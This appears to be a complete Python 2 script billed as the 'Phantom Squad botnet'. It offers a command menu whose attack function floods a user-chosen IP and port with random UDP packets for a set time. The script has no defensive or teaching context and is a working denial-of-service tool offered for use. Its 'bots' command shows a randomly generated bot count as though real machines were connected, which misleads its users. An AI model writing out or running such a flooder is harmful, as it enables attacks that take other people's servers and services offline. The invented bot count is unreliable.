import os
import sys
import time
import socket
import random
from random import randint

def main():
	os.system("clear")
	print("""
Welcome to the Phantom Squad botnet | VPS not necessary, only recommended

                       Type '!* help' for commands

""")
	net = raw_input("-> ")
	if "!* help" in net:
		help()
	elif "!* attack" in net:
		attack()
	elif "!* bots" in net:
		bots()
	elif "!* quit" in net:
		os.system("clear")
		sys.exit()
	else:
		print ""
		print net + " is not a command."
		time.sleep(3)
		main()

def help():
	print ""
	print "!* help | displays all commands"
	print "!* attack | starts the DDoS interface"
	print "!* bots | Displays the bot count"
	print "!* quit | quits the server and client"
	print ""
	raw_input("Done?[Press enter]...")
	main()

def bots():
	count = random.randint(1000,15000)
	print ""
	print "Bots: ", count
	print ""
	raw_input("Done?[Press enter]...")
	main()

def attack():
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

	bytes = random._urandom(1024)

	print ""
	ip = raw_input("IP-> ")
	port = input("Port-> ")
	dur = input("Time-> ")
	timeout = time.time() + dur
	sent = 0

	while True:
		try:
			if time.time() > timeout:
				break
			else:
				pass
			sock.sendto(bytes,(ip, port))
			sent = sent + 1
			print "%s | %s | %s"%(ip, port, sent)
		except KeyboardInterrupt:
			time.sleep(4)
			main()

main()
